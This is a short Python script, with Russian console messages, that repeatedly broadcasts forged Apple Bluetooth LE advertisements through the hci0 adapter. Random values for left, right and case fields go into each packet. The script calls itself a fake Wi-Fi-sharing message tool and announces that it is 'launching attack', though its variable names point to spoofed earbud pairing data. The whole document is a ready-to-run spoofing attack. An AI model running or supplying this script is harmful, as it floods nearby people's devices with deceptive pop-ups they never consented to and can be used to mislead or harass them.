#!/usr/bin/env python3

import sys, random
from time import sleep
import bluetooth._bluetooth as bluez
from bluetooth_utils import (toggle_device, start_le_advertising, stop_le_advertising)

dev_id = 0  #hci0
toggle_device(dev_id, True)

data1 = (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45)
data2 = (0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a)

print("Утилита для создания фейкового сообщения о Wi-Fi шеринге")
print("Должны быть установлены: pybluez, в директории должен быть файл bluetooth_utils")
print("Проверьте, что интерфейс hcitool dev - hci0")
print("Запускаю атаку...")    
while True:
    try:
        sock = bluez.hci_open_dev(dev_id)
    except:
        print("Невозможно получить доступ к hci0")
        sys.exit()
    left_speaker = (random.randint(0, 100),)
    right_speaker = (random.randint(0, 100),)
    case = (random.randint(0, 100),)
    start_le_advertising(sock, adv_type=0x03, min_interval=200, max_interval=200, data=(data1 + left_speaker + right_speaker + case + data2))
    sleep(2)
    stop_le_advertising(sock)

